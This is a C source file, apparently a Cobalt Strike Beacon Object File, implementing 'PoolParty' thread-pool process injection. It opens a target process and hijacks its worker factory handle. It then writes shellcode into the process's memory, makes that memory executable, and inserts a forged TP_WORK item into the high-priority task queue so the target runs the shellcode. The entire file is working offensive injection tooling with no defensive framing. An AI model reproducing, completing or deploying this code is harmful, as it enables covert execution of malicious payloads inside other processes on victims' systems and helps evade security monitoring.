#include "PoolParty.h"

void RemoteTpWorkInsertion(HANDLE hTarget, PVOID pShellcodeAddress) {
    _NtWriteVirtualMemory NtWriteVirtualMemory = (_NtWriteVirtualMemory)(GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtWriteVirtualMemory"));
    
    WORKER_FACTORY_BASIC_INFORMATION WorkerFactoryInformation = GetWorkerFactoryBasicInformation();
    
    PFULL_TP_POOL TargetTpPool = NULL;
    TargetTpPool = (PFULL_TP_POOL)MSVCRT$calloc(1, sizeof(PFULL_TP_POOL));
    SIZE_T stBytesRead = 0;
    KERNEL32$ReadProcessMemory(hTarget, WorkerFactoryInformation.StartParameter, TargetTpPool, sizeof(FULL_TP_POOL), &stBytesRead);

    PTPP_QUEUE TargetTaskQueueHighPriorityList = &TargetTpPool->TaskQueue[TP_CALLBACK_PRIORITY_HIGH]->Queue;
    
    PFULL_TP_WORK pTpWork = KERNEL32$CreateThreadpoolWork((PTP_WORK_CALLBACK)pShellcodeAddress, NULL, NULL);
    pTpWork->CleanupGroupMember.Pool = (PFULL_TP_POOL)(WorkerFactoryInformation.StartParameter);
    pTpWork->Task.ListEntry.Flink = TargetTaskQueueHighPriorityList;
    pTpWork->Task.ListEntry.Blink = TargetTaskQueueHighPriorityList;
    pTpWork->WorkState.Exchange = 0x2;

    DWORD dwOldProtect = NULL;
    PFULL_TP_WORK pRemoteTpWork = (PFULL_TP_WORK)(KERNEL32$VirtualAllocEx(hTarget, NULL, sizeof(FULL_TP_WORK), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));
    NTSTATUS Ntstatus = NtWriteVirtualMemory(hTarget, pRemoteTpWork, pTpWork, sizeof(FULL_TP_WORK), NULL);

    KERNEL32$VirtualProtectEx(hTarget, pRemoteTpWork, sizeof(FULL_TP_WORK), PAGE_EXECUTE_READ, &dwOldProtect);

    PLIST_ENTRY RemoteWorkItemTaskList = NULL;
    RemoteWorkItemTaskList = (PLIST_ENTRY)MSVCRT$calloc(1, sizeof(PLIST_ENTRY));
    RemoteWorkItemTaskList = &pRemoteTpWork->Task.ListEntry;

    NtWriteVirtualMemory(hTarget, &TargetTpPool->TaskQueue[TP_CALLBACK_PRIORITY_HIGH]->Queue.Flink, &RemoteWorkItemTaskList, sizeof(RemoteWorkItemTaskList), NULL);
    NtWriteVirtualMemory(hTarget, &TargetTpPool->TaskQueue[TP_CALLBACK_PRIORITY_HIGH]->Queue.Blink, &RemoteWorkItemTaskList, sizeof(RemoteWorkItemTaskList), NULL);
}

void Inject2(DWORD dwTargetProcessId, CHAR* shellcode, SIZE_T shellcodeSize) {
    _NtWriteVirtualMemory NtWriteVirtualMemory = (_NtWriteVirtualMemory)(GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtWriteVirtualMemory"));
    
    HANDLE hTarget = NULL;
    DWORD dwOldProtect = NULL;
    hTarget = KERNEL32$OpenProcess(PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_DUP_HANDLE | PROCESS_QUERY_INFORMATION, FALSE, dwTargetProcessId);
    
    if (hTarget) {
        HijackTpWorkerFactoryHandle(hTarget, WORKER_FACTORY_ALL_ACCESS);
        
        PVOID pShellcodeAddress = KERNEL32$VirtualAllocEx(hTarget, NULL, shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        NtWriteVirtualMemory(hTarget, pShellcodeAddress, shellcode, shellcodeSize, NULL);
        KERNEL32$VirtualProtectEx(hTarget, pShellcodeAddress, shellcodeSize, PAGE_EXECUTE_READ, &dwOldProtect);
        
        RemoteTpWorkInsertion(hTarget, pShellcodeAddress);
    } else { 
          BeaconPrintf(CALLBACK_OUTPUT, "PID %d inaccessible", dwTargetProcessId);
        }
}
